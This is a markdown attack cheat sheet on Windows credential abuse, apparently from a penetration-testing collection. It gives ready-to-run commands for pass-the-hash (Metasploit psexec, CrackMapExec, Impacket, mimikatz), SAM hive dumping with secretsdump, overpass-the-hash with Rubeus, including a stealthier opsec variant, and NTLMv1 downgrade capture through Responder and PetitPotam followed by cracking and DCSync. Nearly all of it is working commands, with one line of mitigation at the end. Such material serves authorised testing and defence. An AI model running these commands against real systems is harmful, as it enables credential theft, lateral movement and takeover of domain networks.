## Pass-the-Hash

The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since Windows Vista, attackers have been unable to pass-the-hash to local admin accounts that weren’t the built-in RID 500.

- Metasploit
    
    ```
    use exploit/windows/smb/psexec
    set RHOST 10.2.0.3
    set SMBUser jarrieta
    set SMBPass nastyCutt3r  
    # NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack.
    # NOTE2: Require the full NT hash, you may need to add the "blank" LM (aad3b435b51404eeaad3b435b51404ee)
    set PAYLOAD windows/meterpreter/bind_tcp
    run
    shell
    ```
    
- CrackMapExec
    
    ```
    cme smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
    ```
    
- Impacket suite
    
    ```
    proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d
    ```
    
- Windows RDP and mimikatz
    
    ```
    sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:b73fdfe10e87b4ca5c0d957f81de6863
    sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the users ntlm hash> /run:"mstsc.exe /restrictedadmin"
    ```
    

You can extract the local **SAM database** to find the local administrator hash :

```
C:\> reg.exe save hklm\sam c:\temp\sam.save
C:\> reg.exe save hklm\security c:\temp\security.save
C:\> reg.exe save hklm\system c:\temp\system.save
$ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

## OverPass-the-Hash (pass the key)

In this technique, instead of passing the hash directly, we use the NT hash of an account to request a valid Kerberost ticket (TGT).

### Using impacket

```
root@kali:~$ python ./getTGT.py -hashes ":1a59bd44fe5bec39c44c8cd3524dee" lab.ropnop.com
root@kali:~$ export KRB5CCNAME="/root/impacket-examples/velociraptor.ccache"
root@kali:~$ python3 psexec.py "jurassic.park/velociraptor@labwws02.jurassic.park" -k -no-pass

# also with the AES Key if you have it
root@kali:~$ ./getTGT.py -aesKey xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx lab.ropnop.com

root@kali:~$ ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V 5
root@kali:~$ kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM
root@kali:~$ klist
```

### Using Rubeus

```
# Request a TGT as the target user and pass it into the current session
# NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt

# More stealthy variant, but requires the AES256 hash
.\Rubeus.exe asktgt /user:Administrator /aes256:[AES256HASH] /opsec /ptt

# Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe
```

## Capturing and cracking Net-NTLMv1/NTLMv1 hashes

> Net-NTLM (NTLMv1) hashes are used for network authentication (they are derived from a challenge/response algorithm and are based on the user's NT hash.

:information_source: : Coerce a callback using PetitPotam or SpoolSample on an affected machine and downgrade the authentication to **NetNTLMv1 Challenge/Response authentication**. This uses the outdated encryption method DES to protect the NT/LM Hashes.

**Requirements**:

- LmCompatibilityLevel = 0x1: Send LM & NTLM (`reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel`)

**Exploitation**:

- Capturing using Responder: Edit the `/etc/responder/Responder.conf` file to include the magical **1122334455667788** challenge
    
    ```
    HTTPS = On
    DNS = On
    LDAP = On
    ...
    ; Custom challenge.
    ; Use "Random" for generating a random challenge for each requests (Default)
    Challenge = 1122334455667788
    ```
    
- Fire Responder: `responder -I eth0 --lm`, if `--disable-ess` is set, extended session security will be disabled for NTLMv1 authentication
    
- Force a callback:
    
    ```
    PetitPotam.exe Responder-IP DC-IP # Patched around August 2021
    PetitPotam.py -u Username -p Password -d Domain -dc-ip DC-IP Responder-IP DC-IP # Not patched for authenticated users
    ```
    
- If you got some `NTLMv1 hashes`, you need to format them to submit them on [crack.sh](https://crack.sh/netntlm/)
    
    ```
    username::hostname:response:response:challenge -> NTHASH:response
    NTHASH:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972
    ```
    
- Or crack them with Hashcat / John The Ripper
    
    ```
    john --format=netntlm hash.txt
    hashcat -m 5500 -a 3 hash.txt
    ```
    
- Now you can DCSync using the Pass-The-Hash with the DC machine account
    

:warning: NTLMv1 with SSP(Security Support Provider) changes the server challenge and is not quite ideal for the attack, but it can be used.

**Mitigations**:

- Set the Lan Manager authentication level to `Send NTLMv2 responses only. Refuse LM & NTLM`